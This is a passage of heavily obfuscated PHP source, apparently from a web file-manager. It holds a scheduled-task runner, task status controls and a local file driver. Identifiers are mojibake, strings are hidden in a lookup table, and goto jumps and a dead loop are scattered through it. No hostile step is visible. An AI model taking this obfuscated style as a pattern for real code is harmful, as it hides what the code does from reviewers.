$¸îØë– = $ú€–ü®‹[$›Úá¨ãÍ]; if (!$¸îØë–[$Ü ±»‚Ÿ[483]] || $¸îØë–[$Ü ±»‚Ÿ[1749]] != $Ü ±»‚Ÿ[91]) { continue; } if (!self::taskTimeCheck($¸îØë–)) { continue; } self::taskRun($¸îØë–); } Hook::trigger($Ü ±»‚Ÿ[1750]); self::taskQueueRun($ıë‡ÖÜŞ); } private static function taskQueueRun($¦çêÍáî) { $Óğè¡‚¨ = 10; while (!0) { $»óÖ®²á = TaskQueue::run(); if ($»óÖ®²á === !1) { break; } if (timeFloat() - $¦çêÍáî >= $Óğè¡‚¨) { break; } } } private static function taskTimeCheck($Â©Šı–ù) { $³Ïã¬®… =& $_SERVER[§Êá¸İ]; $Öàì™  = json_decode($Â©Šı–ù[$³Ïã¬®…[206]], !0); $Øóò™ï = intval($Â©Šı–ù[$³Ïã¬®…[1730]]); $ô¥¦ˆ¶Ç = strtotime($³Ïã¬®…[1751] . $Öàì™ [$³Ïã¬®…[1752]] . $³Ïã¬®…[1753]) - strtotime($³Ïã¬®…[1754]); $Ô”èèÚ¼ = time() - strtotime(date($³Ïã¬®…[1755]) . $³Ïã¬®…[1756]); $ï•¿¦›à = $Ô”èèÚ¼ >= $ô¥¦ˆ¶Ç && $Ô”èèÚ¼ <= $ô¥¦ˆ¶Ç + 3600; switch ($Öàì™ [$³Ïã¬®…[33]]) { case $³Ïã¬®…[1757]: if (time() - $Øóò™ï < 3600 * 24 * 30) { return !1; } if ($Öàì™ [$³Ïã¬®…[1757]] == date($³Ïã¬®…[1758]) && $ï•¿¦›à) { return !0; } break; case $³Ïã¬®…[1759]: if (time() - $Øóò™ï < 3600 * 24 * 7) { return !1; } $¨İµ¨Ê‹ = date($³Ïã¬®…[1760]) == 0 ? 7 : date($³Ïã¬®…[1760]); if ($Öàì™ [$³Ïã¬®…[1759]] == $¨İµ¨Ê‹ && $ï•¿¦›à) { return !0; } break; case $³Ïã¬®…[1752]: if (time() - $Øóò™ï < 3600 * 24) { return !1; } if ($ï•¿¦›à) { return !0; } break; case $³Ïã¬®…[1761]: if (time() - $Øóò™ï >= floatval($Öàì™ [$³Ïã¬®…[1761]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $¢½¥­´Ÿ =& $_SERVER[§Êá¸İ]; static $´õ Õ¥¬ = 0; $ÏÁÙ˜³ª = 300; if (!$´õ Õ¥¬) { $´õ Õ¥¬ = time(); } if (time() - $´õ Õ¥¬ < $ÏÁÙ˜³ª) { return; } $´õ Õ¥¬ = time(); $€‡Úğèà = Model($¢½¥­´Ÿ[585])->db($¢½¥­´Ÿ[12]); if ($€‡Úğèà) { $€‡Úğèà->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($¢½¥­´Ÿ[1762], $¢½¥­´Ÿ[1763]); die; } } public static function taskRun($ÄüÏ“î¸) { $ÌÙ»ü—í =& $_SERVER[§Êá¸İ]; self::log($ÌÙ»ü—í[1764] . $ÄüÏ“î¸[$ÌÙ»ü—í[483]] . $ÌÙ»ü—í[1765] . $ÄüÏ“î¸[$ÌÙ»ü—í[32]] . $ÌÙ»ü—í[1766] . $ÄüÏ“î¸[$ÌÙ»ü—í[1767]]); Model($ÌÙ»ü—í[1748])->run($ÄüÏ“î¸[$ÌÙ»ü—í[483]]); $õÆ„Ö”É = timeFloat(); $€Êóåï­ = $ÌÙ»ü—í[12]; switch ($ÄüÏ“î¸[$ÌÙ»ü—í[33]]) { case $ÌÙ»ü—í[383]: $Ü¼«Ûğş = url_request($ÄüÏ“î¸[$ÌÙ»ü—í[1767]], $ÌÙ»ü—í[261], !1, !1, !1, !1, 10); if ($Ü¼«Ûğş[$ÌÙ»ü—í[837]]) { $€Êóåï­ = strlen($Ü¼«Ûğş[$ÌÙ»ü—í[1297]]); } break; case $ÌÙ»ü—í[260]: $€Êóåï­ = Hook::apply($ÄüÏ“î¸[$ÌÙ»ü—í[1767]]); default: break; } Model($ÌÙ»ü—í[1768])->add(array($ÌÙ»ü—í[1769] => $ÌÙ»ü—í[12], $ÌÙ»ü—í[1770] => $ÌÙ»ü—í[228], $ÌÙ»ü—í[33] => $ÌÙ»ü—í[1771] . $ÄüÏ“î¸[$ÌÙ»ü—í[483]], $ÌÙ»ü—í[1772] => json_encode(array($ÌÙ»ü—í[32] => $ÄüÏ“î¸[$ÌÙ»ü—í[32]], $ÌÙ»ü—í[1773] => timeFloat() - $õÆ„Ö”É, $ÌÙ»ü—í[369] => $€Êóåï­)))); $åÜìÜû‰ = $€Êóåï­ ? $ÌÙ»ü—í[1774] . $€Êóåï­ : $ÌÙ»ü—í[12]; self::log($ÌÙ»ü—í[1775] . $ÄüÏ“î¸[$ÌÙ»ü—í[483]] . $ÌÙ»ü—í[178] . $åÜìÜû‰); return !0; } public static function valueGet($ú¤¶¡•Ï) { $Šãà”ØÜ =& $_SERVER[§Êá¸İ]; $ÌÆ¹‡µâ = $Šãà”ØÜ[1776]; $¡»À†ùÏ = Model($Šãà”ØÜ[516])->get($ú¤¶¡•Ï, $ÌÆ¹‡µâ); if (is_null($¡»À†ùÏ)) { Model($Šãà”ØÜ[516])->set($Šãà”ØÜ[837], $Šãà”ØÜ[91], $ÌÆ¹‡µâ); Model($Šãà”ØÜ[516])->set($Šãà”ØÜ[1729], $Šãà”ØÜ[228], $ÌÆ¹‡µâ); $¡»À†ùÏ = Model($Šãà”ØÜ[516])->get($ú¤¶¡•Ï, $ÌÆ¹‡µâ); } return $¡»À†ùÏ; } private static function valueSet($Øšñ‹ª×, $ŒÄÔ®‹Î = false) { $Êİ¤–éğ =& $_SERVER[§Êá¸İ]; $Àµ£Ç‡ = $Êİ¤–éğ[1777]; CacheLock::lock($Àµ£Ç‡); $İ¼½Ò©© = Model($Êİ¤–éğ[516])->set($Øšñ‹ª×, $ŒÄÔ®‹Î, $Êİ¤–éğ[1776]); CacheLock::unlock($Àµ£Ç‡); return $İ¼½Ò©©; } protected static function log($§¹¶®É) { write_log($§¹¶®É, $_SERVER[§Êá¸İ][1763]); } private static function cacheClear() { $ĞÀ€ÆöÃ =& $_SERVER[§Êá¸İ]; Cache::clearMemory(Model($ĞÀ€ÆöÃ[516])->cacheKey($ĞÀ€ÆöÃ[1776])); Cache::clearMemory(Model($ĞÀ€ÆöÃ[516])->cacheKey($ĞÀ€ÆöÃ[1778])); Model($ĞÀ€ÆöÃ[1748])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\163\164\157\x70"; const STATYS_RUNNING = "\162\165\x6e\x6e\x69\156\x67"; const STATYS_KILL = "\153\x69\154\154"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($ÖùÎõÎ, $ğã¾ŒÙ = '', $•Ï¹¾ÀÍ = 0, $»êÂ¢¸ = '') { $°ØÄšÄ =& $_SERVER[§Êá¸İ]; if (self::get($ÖùÎõÎ)) { return; } $this->task = array($°ØÄšÄ[483] => $ÖùÎõÎ, $°ØÄšÄ[1779] => USER_ID, $°ØÄšÄ[1668] => $»êÂ¢¸, $°ØÄšÄ[534] => $°ØÄšÄ[12], $°ØÄšÄ[33] => $ğã¾ŒÙ, $°ØÄšÄ[1153] => $°ØÄšÄ[12], $°ØÄšÄ[1151] => $•Ï¹¾ÀÍ, $°ØÄšÄ[1780] => 0, $°ØÄšÄ[1781] => 0, $°ØÄšÄ[1782] => 0, $°ØÄšÄ[1783] => timeFloat(), $°ØÄšÄ[1784] => 0, $°ØÄšÄ[1785] => 0, $°ØÄšÄ[1786] => 0, $°ØÄšÄ[1787] => 0, $°ØÄšÄ[837] => $°ØÄšÄ[1729]); $GLOBALS[$°ØÄšÄ[1788]] = 1; Hook::bind($°ØÄšÄ[1733], array($this, $°ØÄšÄ[1789])); Hook::bind($°ØÄšÄ[1790], array($this, $°ØÄšÄ[1791])); $this->startAfter(); Hook::trigger($°ØÄšÄ[1792], $this->task); $this->task[$°ØÄšÄ[1785]] = timeFloat(); } public function end($®ÜÏšÃò = '') { $œÏ“İ’ =& $_SERVER[§Êá¸İ]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$œÏ“İ’[1785]]) { self::valueSet($this->task[$œÏ“İ’[483]], !1); } $this->isEnd = !0; if ($®ÜÏšÃò) { $this->task[$œÏ“İ’[534]] = $®ÜÏšÃò; } self::log($œÏ“İ’[1793] . $this->task[$œÏ“İ’[483]] . $œÏ“İ’[1794] . sprintf($œÏ“İ’[937], timeFloat() - $this->task[$œÏ“İ’[1783]]) . $œÏ“İ’[1795]); Hook::unbind($œÏ“İ’[1733], array($this, $œÏ“İ’[1789])); Hook::unbind($œÏ“İ’[1790], array($this, $œÏ“İ’[1791])); $this->endAfter(); $‹ÍÅ›ğ® = $this->task; $this->task = !1; Hook::trigger($œÏ“İ’[1796], $‹ÍÅ›ğ®); } public function update($Çì÷ßö› = 0, $¢ß§Â¾ = false) { $€µ¨İ»¥ =& $_SERVER[§Êá¸İ]; $¢¿Ñ³—¹ =& $this->task; if (!$¢¿Ñ³—¹) { return; } $¢¿Ñ³—¹[$€µ¨İ»¥[1780]] += $Çì÷ßö›; $¢¿Ñ³—¹[$€µ¨İ»¥[1784]] = timeFloat(); if ($¢¿Ñ³—¹[$€µ¨İ»¥[1151]]) { if ($¢¿Ñ³—¹[$€µ¨İ»¥[1151]] < $¢¿Ñ³—¹[$€µ¨İ»¥[1780]]) { $¢¿Ñ³—¹[$€µ¨İ»¥[1151]] = $¢¿Ñ³—¹[$€µ¨İ»¥[1780]]; } $çï°Ê–” = timeFloat() - $¢¿Ñ³—¹[$€µ¨İ»¥[1783]] - $¢¿Ñ³—¹[$€µ¨İ»¥[1786]]; if ($çï°Ê–” <= 0) { $çï°Ê–” = 0.001; } $¢¿Ñ³—¹[$€µ¨İ»¥[1781]] = $¢¿Ñ³—¹[$€µ¨İ»¥[1780]] / $¢¿Ñ³—¹[$€µ¨İ»¥[1151]]; $¢¿Ñ³—¹[$€µ¨İ»¥[1782]] = $¢¿Ñ³—¹[$€µ¨İ»¥[1780]] / $çï°Ê–”; if ($¢¿Ñ³—¹[$€µ¨İ»¥[1781]] > 0) { $¢¿Ñ³—¹[$€µ¨İ»¥[1787]] = $çï°Ê–” * (1 - $¢¿Ñ³—¹[$€µ¨İ»¥[1781]]) / $¢¿Ñ³—¹[$€µ¨İ»¥[1781]]; } $¢¿Ñ³—¹[$€µ¨İ»¥[1787]] = $¢¿Ñ³—¹[$€µ¨İ»¥[1787]] <= 0 ? 0 : $¢¿Ñ³—¹[$€µ¨İ»¥[1787]]; } $this->updateAfter(); $Ì¥å¾¾¡ = 0.2; if (timeFloat() - $¢¿Ñ³—¹[$€µ¨İ»¥[1785]] < $Ì¥å¾¾¡ && !$¢ß§Â¾) { return; } $ôİÉí‹¤ = self::get($¢¿Ñ³—¹[$€µ¨İ»¥[483]]); $õÔÌÄéÙ = $ôİÉí‹¤[$€µ¨İ»¥[837]]; if ($õÔÌÄéÙ == self::STATYS_KILL) { $€¡·€›ˆ = array($€µ¨İ»¥[1797] => LNG($€µ¨İ»¥[1798]), $€µ¨İ»¥[1307] => !1); Cache::set($€µ¨İ»¥[1799] . $this->task[$€µ¨İ»¥[483]], $€¡·€›ˆ, 30); $this->onKill(); $this->end(); die; } else { if ($õÔÌÄéÙ == self::STATYS_STOP) { $»½Ş¹ÀÌ = 2; $ôİÉí‹¤[$€µ¨İ»¥[1786]] += $»½Ş¹ÀÌ; self::valueSet($¢¿Ñ³—¹[$€µ¨İ»¥[483]], $ôİÉí‹¤); sleep($»½Ş¹ÀÌ); $this->update(); return; } } $¢¿Ñ³—¹[$€µ¨İ»¥[837]] = $õÔÌÄéÙ ? $õÔÌÄéÙ : $¢¿Ñ³—¹[$€µ¨İ»¥[837]]; $¢¿Ñ³—¹[$€µ¨İ»¥[1786]] = $ôİÉí‹¤[$€µ¨İ»¥[1786]] ? $ôİÉí‹¤[$€µ¨İ»¥[1786]] : 0; $¢¿Ñ³—¹[$€µ¨İ»¥[1785]] = timeFloat(); Hook::trigger($€µ¨İ»¥[1800], $¢¿Ñ³—¹); self::valueSet($¢¿Ñ³—¹[$€µ¨İ»¥[483]], $¢¿Ñ³—¹); } public function onKillSet($†ÛË§è§, $õŒ€óà” = array()) { $this->onKillCall = array($†ÛË§è§, $õŒ€óà”); } public function onKill() { $î×¾üÈ =& $_SERVER[§Êá¸İ]; self::log($î×¾üÈ[1793] . $this->task[$î×¾üÈ[483]] . $î×¾üÈ[1801]); Hook::trigger($î×¾üÈ[1802], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($Ş¡öùîá) { $ûæ°²ü­ =& $_SERVER[§Êá¸İ]; Cache::set($ûæ°²ü­[1799] . $this->task[$ûæ°²ü­[483]], $Ş¡öùîá, 60); return $Ş¡öùîá; } public static function get($ğ£‘âß) { $ˆÑª²¯ì =& $_SERVER[§Êá¸İ]; $ø®Ã¿äú = self::valueGet($ğ£‘âß); if (is_array($ø®Ã¿äú) && $ø®Ã¿äú[$ˆÑª²¯ì[1803]]) { $¤Œ˜ÕÙ = ActionApply($ø®Ã¿äú[$ˆÑª²¯ì[1803]], array($ø®Ã¿äú)); $ø®Ã¿äú = is_array($¤Œ˜ÕÙ) ? $¤Œ˜ÕÙ : $ø®Ã¿äú; } return $ø®Ã¿äú; } public static function listData() { $‘¶€“• = self::valueGet(); return array_sort_by($‘¶€“•, $_SERVER[§Êá¸İ][1783], !0); } public static function kill($ê½ğ”Ì‘) { return self::changeStatus($ê½ğ”Ì‘, self::STATYS_KILL); } public static function stop($£ì…¯ñ) { return self::changeStatus($£ì…¯ñ, self::STATYS_STOP); } public static function restart($‡²³¢ØÔ) { return self::changeStatus($‡²³¢ØÔ, self::STATYS_RUNNING); } public static function killAll() { $¯û˜‡’è =& $_SERVER[§Êá¸İ]; $å¯È±â = self::listData(); foreach ($å¯È±â as $¹ÏÂŒöó) { self::kill($¹ÏÂŒöó[$¯û˜‡’è[483]]); } sleep(2); foreach ($å¯È±â as $¹ÏÂŒöó) { self::valueSet($¹ÏÂŒöó[$¯û˜‡’è[483]], !1); } } private static function changeStatus($‡¦±ıúó, $èÇ³”—Ü) { $Ò¢ÖÊ¾‡ =& $_SERVER[§Êá¸İ]; $É—¶©¹¡ = self::valueGet($‡¦±ıúó); if (!$É—¶©¹¡) { return !1; } $É—¶©¹¡[$Ò¢ÖÊ¾‡[837]] = $èÇ³”—Ü; self::valueSet($‡¦±ıúó, $É—¶©¹¡); self::log($Ò¢ÖÊ¾‡[1804] . $É—¶©¹¡[$Ò¢ÖÊ¾‡[483]] . $Ò¢ÖÊ¾‡[1805] . $èÇ³”—Ü); return !0; } public static function valueGet($…«ëüÇ = false) { $ìÕ¿È¢ç =& $_SERVER[§Êá¸İ]; if ($…«ëüÇ) { $¸ï‹Äœ = Model($ìÕ¿È¢ç[528])->where(array($ìÕ¿È¢ç[97] => $…«ëüÇ, $ìÕ¿È¢ç[33] => $ìÕ¿È¢ç[1160]))->find(); return $¸ï‹Äœ ? json_decode($¸ï‹Äœ[$ìÕ¿È¢ç[450]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($–ùŸ¶‚ = false) { $‡©¯¼çå =& $_SERVER[§Êá¸İ]; $ÏŠÔÊ¹¤ = array($‡©¯¼çå[33] => $‡©¯¼çå[1160]); if ($–ùŸ¶‚) { $ÏŠÔÊ¹¤[$‡©¯¼çå[1779]] = $–ùŸ¶‚; } $Îµ¯ÎŠ = Model($‡©¯¼çå[528])->where($ÏŠÔÊ¹¤)->select(); $Îµ¯ÎŠ = $Îµ¯ÎŠ ? $Îµ¯ÎŠ : array(); foreach ($Îµ¯ÎŠ as $”¹ŠŠˆª => $²¹Ñ÷È†) { $Îµ¯ÎŠ[$”¹ŠŠˆª] = json_decode($²¹Ñ÷È†[$‡©¯¼çå[450]], !0); } return $Îµ¯ÎŠ; } public static function valueSet($üÈá”†é, $ÂÍÖ®ÄÉ) { $ô‚ºõô =& $_SERVER[§Êá¸İ]; if (!$ÂÍÖ®ÄÉ) { return Model($ô‚ºõô[528])->where(array($ô‚ºõô[97] => $üÈá”†é, $ô‚ºõô[33] => $ô‚ºõô[1160]))->delete(); } $›¹¯âõ¡ = json_encode($ÂÍÖ®ÄÉ); if (!$›¹¯âõ¡) { ob_start(); var_dump($ÂÍÖ®ÄÉ); $‹‡èÛ·ˆ = ob_get_clean(); self::log($ô‚ºõô[1806] . json_encode_force($‹‡èÛ·ˆ)); } if (!$üÈá”†é || !$ÂÍÖ®ÄÉ[$ô‚ºõô[483]]) { return !1; } $¹®ŸéÓ± = array($ô‚ºõô[33] => $ô‚ºõô[1160], $ô‚ºõô[1779] => USER_ID, $ô‚ºõô[97] => $üÈá”†é, $ô‚ºõô[450] => $›¹¯âõ¡); $ÔØï¥‘° = $ô‚ºõô[1807]; CacheLock::lock($ÔØï¥‘°); Model($ô‚ºõô[528])->add($¹®ŸéÓ±, array(), !0); CacheLock::unlock($ÔØï¥‘°); } public static function log($ğ××ÒÏ) { if (!GLOBAL_DEBUG) { return; } write_log($ğ××ÒÏ, $_SERVER[§Êá¸İ][1808]); } } goto f£íƒóÆ•¶; D‚¥Éùœ: define($_SERVER[§Êá¸İ][685], $_SERVER[§Êá¸İ][686]); $iwkgejloxc = $_SERVER[§Êá¸İ][687]; while ($iwkgejloxc < $_SERVER[§Êá¸İ][688]) { if ($iwkgejloxc >= 0) { break; } $iwkgejloxc++; } goto FÙ´Éù³Ó¡; FÁòŒˆé†Ï: class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($“ëºÊò¶) { if (substr($“ëºÊò¶, 0, 2) == $_SERVER[§Êá¸İ][1420]) { $“ëºÊò¶ = BASIC_PATH . substr($“ëºÊò¶, 2); } return $“ëºÊò¶; } public function iconvApp($ñÚšÎÙÎ) { $”Íàş¸­ =& $_SERVER[§Êá¸İ]; global $config; return $this->iconvTo($ñÚšÎÙÎ, $config[$”Íàş¸­[1447]], $config[$”Íàş¸­[1446]]); } public function iconvSystem($ÌÎ„¹Ñ¨) { $ÕŠÀŞĞ =& $_SERVER[§Êá¸İ]; global $config; return $this->iconvTo($ÌÎ„¹Ñ¨, $config[$ÕŠÀŞĞ[1446]], $config[$ÕŠÀŞĞ[1447]]); } public function getPathOuter($öÉş’¯Ô) { $‚õÓˆõŒ =& $_SERVER[§Êá¸İ]; $„¢¤âÈ = $this->iconvApp($this->pathBase); $öÉş’¯Ô = $this->iconvApp($öÉş’¯Ô); if (substr($„¢¤âÈ, 0, 2) == $‚õÓˆõŒ[1420]) { $„¢¤âÈ = BASIC_PATH . substr($„¢¤âÈ, 2); } if (substr($öÉş’¯Ô, 0, 2) == $‚õÓˆõŒ[1420]) { $öÉş’¯Ô = BASIC_PATH . substr($öÉş’¯Ô, 2); } $„¢¤âÈ = KodIO::clear($„¢¤âÈ); $öÉş’¯Ô = KodIO::clear($öÉş’¯Ô); $öÉş’¯Ô = substr($öÉş’¯Ô, strlen($„¢¤âÈ)); if (empty($this->pathDriver)) { return $öÉş’¯Ô; } return $this->pathDriver . $‚õÓˆõŒ[8] . ltrim($öÉş’¯Ô, $‚õÓˆõŒ[8]); } public function mkfile($Ñ¹€ĞÂº, $ÚÒĞÌ’† = '', $È–æƒ‡– = REPEAT_RENAME) { $Ñ¹€ĞÂº = $this->iconvSystem($Ñ¹€ĞÂº); @touch($Ñ¹€ĞÂº); if ($ÚÒĞÌ’†) { file_put_contents($Ñ¹€ĞÂº, $ÚÒĞÌ’†); } @chmod($Ñ¹€ĞÂº, $this->pathAuth); if (is_file($Ñ¹€ĞÂº)) { return $this->getPathOuter($Ñ¹€ĞÂº); } $this->writeLog(__FUNCTION__ . $_SERVER[§Êá¸İ][1458], !0); return !1; } public function mkdir($¸æóéÅÚ, $Ş¸®¼ = REPEAT_SKIP) { $¸æóéÅÚ = $this->iconvSystem($¸æóéÅÚ); if (is_dir($¸æóéÅÚ)) { return $this->getPathOuter($¸æóéÅÚ); } @mkdir($¸æóéÅÚ, $this->pathAuth, !0); @chmod($¸æóéÅÚ, $this->pathAuth); if (is_dir($¸æóéÅÚ)) { return $this->getPathOuter($¸æóéÅÚ); } $this->writeLog(__FUNCTION__ . $_SERVER[§Êá¸İ][1458], !0); return !1; } public function copyFile($ìúí€…÷, $ï•±˜›Ì) { $this->mkdir($this->pathFather($ï•±˜›Ì)); $ìúí€…÷ = $this->iconvSystem($ìúí€…÷); $ï•±˜›Ì = $this->iconvSystem($ï•±˜›Ì); $Âóº¾· = copy_64($ìúí€…÷, $ï•±˜›Ì); @chmod($ï•±˜›Ì, $this->pathAuth); if ($Âóº¾·) { return $this->getPathOuter($ï•±˜›Ì); } $this->writeLog(__FUNCTION__ . $_SERVER[§Êá¸İ][1458], !0); return !1; } public function moveFile($¬¶‘¥, $ğùÈÖ”Ï) { $this->mkdir($this->pathFather($ğùÈÖ”Ï)); $¬¶‘¥ = $this->iconvSystem($¬¶‘¥); $ğùÈÖ”Ï = $this->iconvSystem($ğùÈÖ”Ï); $ĞÚĞ¡¹’ = intval(@rename($¬¶‘¥, $ğùÈÖ”Ï)); if (!$ĞÚĞ¡¹’) { if ($ĞÚĞ¡¹’ = intval(@copy_64($¬¶‘¥, $ğùÈÖ”Ï))) { @unlink($¬¶‘¥); } } @chmod($ğùÈÖ”Ï, $this->pathAuth); if ($ĞÚĞ¡¹’) { return $this->getPathOuter($ğùÈÖ”Ï); } $this->writeLog(__FUNCTION__ . $_SERVER[§Êá¸İ][1458], !0); return !1; } public function movePath($Ì¹³±‡˜, $ó¤ÀÙÙÙ, $éÍÜŠäá = false) { $Íîá×‚Ê =& $_SERVER[§Êá¸İ]; $Ì¹³±‡˜ = $this->iconvSystem($Ì¹³±‡˜); $ó¤ÀÙÙÙ = $this->iconvSystem($ó¤ÀÙÙÙ); $üÙ§üë = rtrim($ó¤ÀÙÙÙ, $Íîá×‚Ê[8]) . $Íîá×‚Ê[8] . ($éÍÜŠäá ? $éÍÜŠäá : get_path_this($Ì¹³±‡˜)); if (file_exists($üÙ§üë)) { return !1; } $‡¹Âú‚Á = intval(@rename($Ì¹³±‡˜, $üÙ§üë)); $‡¹Âú‚Á = file_exists($üÙ§üë); if ($‡¹Âú‚Á) { return $this->getPathOuter($üÙ§üë); } $this->writeLog(__FUNCTION__ . $Íîá×‚Ê[1458], !0); return !1; } public function delFile($—İµ®ì) { $—İµ®ì = $this->iconvSystem($—İµ®ì); if (!@unlink($—İµ®ì)) { @chmod($—İµ®ì, $this->pathAuth); if (@unlink($—İµ®ì)) { return !0; } $this->writeLog(__FUNCTION__ . $_SERVER[§Êá¸İ][1458], !0); return !1; } return !0; } public function delFolder($œ»Ûş¿Õ) { $Ãñ›ÇÍÀ =& $_SERVER[§Êá¸İ]; $œ»Ûş¿Õ = $this->iconvSystem($œ»Ûş¿Õ); if (!is_dir($œ»Ûş¿Õ)) { return !0; } if (!($Ç“ƒë»‚ = opendir($œ»Ûş¿Õ))) { return !1; } while (($»€ÉÜêò = readdir($Ç“ƒë»‚)) !== !1) { if ($»€ÉÜêò == $Ãñ›ÇÍÀ[10] || $»€ÉÜêò == $Ãñ›ÇÍÀ[1373]) { continue; } $˜îÉ¥é = $œ»Ûş¿Õ . $Ãñ›ÇÍÀ[8] . $»€ÉÜêò; if (is_file($˜îÉ¥é) || is_link($˜îÉ¥é)) { if (!unlink($˜îÉ¥é)) { chmod($˜îÉ¥é, $this->pathAuth); if (!unlink($˜îÉ¥é)) { return !1; } } } else { if (is_dir($˜îÉ¥é)) { chmod($˜îÉ¥é, $this->pathAuth); $˜îÉ¥é = $this->iconvApp($˜îÉ¥é); if (!$this->delFolder($˜îÉ¥é)) { return !1; } } } } closedir($Ç“ƒë»‚); return rmdir($œ»Ûş¿Õ); } public function rename($Õ’ùş, $ğ¤ĞîŸì) { $Š¢³İ©¹ =& $_SERVER[§Êá¸İ]; $ÓŒÖşã¿ = $this->fileNameAuto($this->pathFather($Õ’ùş), $ğ¤ĞîŸì); $ÓŒÖşã¿ = $this->iconvSystem($ÓŒÖşã¿); $Õ’ùş = $this->iconvSystem($Õ’ùş); $ŠÖ¬›Â = $this->pathFather($Õ’ùş); $ÍâˆÙŠÜ = rtrim($ŠÖ¬›Â, $Š¢³İ©¹[8]) . $Š¢³İ©¹[8] . $ÓŒÖşã¿; $…õ½ùê® = @rename($Õ’ùş, $ÍâˆÙŠÜ); $ÍâˆÙŠÜ = $this->iconvApp($ÍâˆÙŠÜ); if ($…õ½ùê®) { return $this->getPathOuter($ÍâˆÙŠÜ); } $this->writeLog(__FUNCTION__ . $Š¢³İ©¹[1458], !0); return !1; } public function size($ÓÅäùÙñ) { $ÓÅäùÙñ = $this->iconvSystem($ÓÅäùÙñ); return filesize_64($ÓÅäùÙñ); } public function info($ßãÉÔí) { $ßãÉÔí = $this->iconvSystem($ßãÉÔí); if ($this->isFolder($ßãÉÔí)) { return $this->folderInfo($ßãÉÔí); } else { if ($this->isFile($ßãÉÔí)) { return $this->fileInfo($ßãÉÔí); } } return !1; } protected function infoChildren($¸®èÂÙÍ, &$œñ¤¼¢–, $şíÃúÅÒ = true) { $ô‚èæŞö =& $_SERVER[§Êá¸İ]; check_abort_echo(); $¸®èÂÙÍ = rtrim($¸®èÂÙÍ, $ô‚èæŞö[8]) . $ô‚èæŞö[8]; if ($şíÃúÅÒ) { $¸®èÂÙÍ = $this->iconvSystem($¸®èÂÙÍ); } if (!($¦‹…¹¹ = @opendir($¸®èÂÙÍ))) { return; } while (($¸–¯…å = readdir($¦‹…¹¹)) !== !1) { if ($¸–¯…å == $ô‚èæŞö[10] || $¸–¯…å == $ô‚èæŞö[1373]) { continue; } $ù­ØÎ£ = $¸®èÂÙÍ . $¸–¯…å; if (is_file($ù­ØÎ£) || is_link($ù­ØÎ£)) { $œñ¤¼¢–[$ô‚èæŞö[80]]++; $œñ¤¼¢–[$ô‚èæŞö[79]] += filesize_64($ù­ØÎ£); } else { if (is_dir($ù­ØÎ£)) { $œñ¤¼¢–[$ô‚èæŞö[81]]++; $this->infoChildren($ù­ØÎ£, $œñ¤¼¢–, !1); } } } closedir($¦‹…¹¹); } private function folderInfo($ßÕ±¤¶ğ, $éĞ÷ü´ü = false) { $üÜµƒöñ =& $_SERVER[§Êá¸İ]; $ßÕ±¤¶ğ = rtrim($ßÕ±¤¶ğ, $üÜµƒöñ[8]) . $üÜµƒöñ[8]; $¡ÁùâŒ½ = $this->iconvApp($this->pathThis($ßÕ±¤¶ğ)); if ($éĞ÷ü´ü) { return array($üÜµƒöñ[32] => $¡ÁùâŒ½, $üÜµƒöñ[87] => $this->getPathOuter($ßÕ±¤¶ğ), $üÜµƒöñ[33] => $üÜµƒöñ[78]); } $ú×ÄğÜ½ = array($üÜµƒöñ[32] => $¡ÁùâŒ½, $üÜµƒöñ[87] => $this->getPathOuter($ßÕ±¤¶ğ), $üÜµƒöñ[33] => $üÜµƒöñ[78], $üÜµƒöñ[231] => @filectime($ßÕ±¤¶ğ), $üÜµƒöñ[88] => @filemtime($ßÕ±¤¶ğ), $üÜµƒöñ[1462] => @fileatime($ßÕ±¤¶ğ), $üÜµƒöñ[1463] => is_readable($ßÕ±¤¶ğ), $üÜµƒöñ[1464] => is_writable($ßÕ±¤¶ğ), $üÜµƒöñ[1465] => get_mode($ßÕ±¤¶ğ)); return $ú×ÄğÜ½; } private function fileInfo($¼õÈÔ£˜, $Ô–ÃŸ· = false) { $Õ¾¶ìÃí =& $_SERVER[§Êá¸İ]; $‚éšñı = $this->iconvApp($this->pathThis($¼õÈÔ£˜)); if ($Ô–ÃŸ·) { return array($Õ¾¶ìÃí[32] => $‚éšñı, $Õ¾¶ìÃí[87] => $this->getPathOuter($¼õÈÔ£˜), $Õ¾¶ìÃí[33] => $Õ¾¶ìÃí[230], $Õ¾¶ìÃí[79] => $this->size($¼õÈÔ£˜), $Õ¾¶ìÃí[169] => $this->ext($‚éšñı)); } $“ÙÇƒ‰Ü = array($Õ¾¶ìÃí[32] => $‚éšñı, $Õ¾¶ìÃí[87] => $this->getPathOuter($¼õÈÔ£˜), $Õ¾¶ìÃí[33] => $Õ¾¶ìÃí[230], $Õ¾¶ìÃí[231] => @filectime($¼õÈÔ£˜), $Õ¾¶ìÃí[88] => @filemtime($¼õÈÔ£˜), $Õ¾¶ìÃí[1462] => @fileatime($¼õÈÔ£˜), $Õ¾¶ìÃí[79] => $this->size($¼õÈÔ£˜), $Õ¾¶ìÃí[169] => $this->ext($‚éšñı), $Õ¾¶ìÃí[1463] => is_readable($¼õÈÔ£˜), $Õ¾¶ìÃí[1464] => is_writable($¼õÈÔ£˜), $Õ¾¶ìÃí[1465] => get_mode($¼õÈÔ£˜)); return $“ÙÇƒ‰Ü; } public function exist($í¹ø©˜Ÿ) { $í¹ø©˜Ÿ = $this->iconvSystem($í¹ø©˜Ÿ); return @file_exists($í¹ø©˜Ÿ); } public function isFile($¶Ç³°óÅ) { $¶Ç³°óÅ = $this->iconvSystem($¶Ç³°óÅ); return @is_file($¶Ç³°óÅ); } public function isFolder($ÕÁáÂŸ¥) { $ÕÁáÂŸ¥ = $this->iconvSystem($ÕÁáÂŸ¥); return @is_dir($ÕÁáÂŸ¥); } public function listPath($“‹ç‚×ñ, $·ãñ‚ÓÇ = false) { $ÂÎëºŸ¢ =& $_SERVER[§Êá¸İ]; $“‹ç‚×ñ = $this->iconvSystem($“‹ç‚×ñ); 